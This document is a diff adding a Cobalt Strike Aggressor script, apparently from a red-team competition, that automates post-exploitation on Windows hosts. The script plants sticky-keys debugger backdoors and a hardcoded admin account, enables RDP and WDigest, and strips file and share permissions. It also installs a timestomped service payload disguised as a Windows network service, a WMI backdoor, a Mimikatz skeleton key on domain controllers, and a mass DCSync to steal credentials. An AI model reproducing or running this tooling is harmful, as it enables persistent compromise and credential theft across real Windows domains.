@@ -1,0 +1,148 @@
+#author: bluescreenofjeff
+
+#Contains portions of scripts written by Raphael Mudge and Chris Nickerson
+
+#slightly modified function from Raphael Mudge
+#https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
+
+sub stickykeys {
+    binput($1, 'stickykeys');
+
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AtBroker.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
+	bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');	
+}
+
+sub persist1 {
+	binput ($1, 'persist1');
+    #enable RDP, disable firewall
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
+    bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
+    bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
+    bshell($1, 'net start TermService');
+
+    #make sure admin is active
+    bshell($1, 'net user Administrator /active:yes');
+
+    #enable wdigest on Win8.1+ boxes
+    bshell($1, 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d "1" /f');
+
+    #image file execution options
+	bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
+
+	#RDP Concurrent connections
+	bshell($1, 'reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f');
+
+	#add backdoor scorebot account with password "RedTeamRules!"
+	bshell($1, 'net user scorebot RedTeamRules! /add');
+	bshell($1, 'net localgroup administrators scorebot /add');
+	blog($1, 'Added local account "scorebot" with password "RedTeamRules!"');
+
+	#enable WinRM
+    binput($1, 'enable WinRM');
+    bpowershell($1, 'Enable-PSRemoting -Force');
+
+    #enable guest account
+    bshell($1, 'net user guest /active:yes');
+	bshell($1, 'takeown /r /d y /f C:\ ');
+	bshell($1, 'icacls C:\ /t /grant Everyone:(OI)(CI)F /Q /C');
+	bshell($1, 'REG ADD "HKLM\System\CurrentControlSet\services\LanmanServer\Parameters" /v NullSessionShares /t REG_SZ /d "C$,admin$,share" /f');
+	bshell($1, 'REG ADD "HKLM\System\CurrentControlSet\Contol\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f');
+
+
+    #service payload
+    bcd($1, 'c:\windows\system32');
+	bupload($1, script_resource("netsrv.exe"));
+	btimestomp($1, "netsrv.exe", "cmd.exe");
+	bshell($1, 'sc delete netsrv');
+	bshell($1, 'sc create netsrv binPath= "C:\windows\system32\netsrv.exe" start= auto DisplayName= "System Network Service"');
+	bshell($1, 'sc description netsrv "Monitors the networks to which the computer has connected, collects and stores information about these networks, and notifies registered applications of state changes."');
+	bshell($1, 'sc start netsrv');
+
+	#disable action center notifications
+	bshell($1, 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f');
+	bshell($1, 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f');
+    
+    #wmic
+    #to be added (maybe)
+
+    #add lee's durien script
+    bcd($1, 'c:\\');
+	bupload($1, script_resource("msupdater.dll"));
+	btimestomp($1, "msupdater.dll", "cmd.exe");
+	bshell($1, 'rundll32.exe msupdater.dll,Start');
+
+    #carlo's userinit backddor
+    #send regsvr command and exe path to carlo to set up
+    #to be added
+
+}
+
+sub wmi_backdoor {
+   bpowershell_import($1, script_resource("PowerSCCM-WMIFunc.ps1"));
+   bpowershell($1, 'Grant-WmiNameSpaceRead -Namespace "root\cimv2"');   
+   blog($1, 'WMI Backdoor deployed');
+}
+
+
+
+sub dcsync-auto {
+
+	@bids = $1;
+
+	$dialog = dialog("Mass DCSync", %(fqdn => "amity.local", domain => 'AMITY', userlist => "/path/to/userlist"), lambda({
+		$handle = openf($3['userlist']);
+		@userlistdata = readAll($handle);
+		closef($handle);
+		println(@userlistdata);
+		println(@bids);
+		foreach $bid (@bids){
+			foreach $user (@userlistdata){
+				bdcsync($bid, $3['$fqdn'], $3['domain'] . $+ . '\\' . $+ . $user);
+			};
+		};
+		}));
+
+	dialog_description($dialog, "Mass DCSync a list of usernames from the specified domain.");
+	
+	drow_text($dialog, "fqdn",  "Domain FQDN:");
+	drow_text($dialog, "domain", "Domain Shortname:");
+	drow_file($dialog, "userlist", "List of users:");
+	
+	dbutton_action($dialog, "Ok");
+	
+	dialog_show($dialog);
+
+}
+
+
+popup beacon_bottom {
+	menu "Persist" {
+		item "Persistence" {
+			local('$bid');
+			foreach $bid ($1) {
+				stickykeys($bid);
+				persist1($bid);
+				wmi_backdoor($bid);
+			}
+		}
+		item "Mimikatz Skeleton Key (DCs only)" {
+			#Backdoors the LSASS process to accept the backdoor password of "mimikatz" for all domain authentication
+			local('$bid');
+			foreach $bid ($1) {
+				binput($1,"mimikatz misc::skeleton");
+				bmimikatz($1, "!privilege::debug");
+				bmimikatz($1, "!misc::skeleton");
+			}
+		}
+		item "Mass DCSync" {
+			dcsync-auto($1);
+		}          
+
+	}
+}
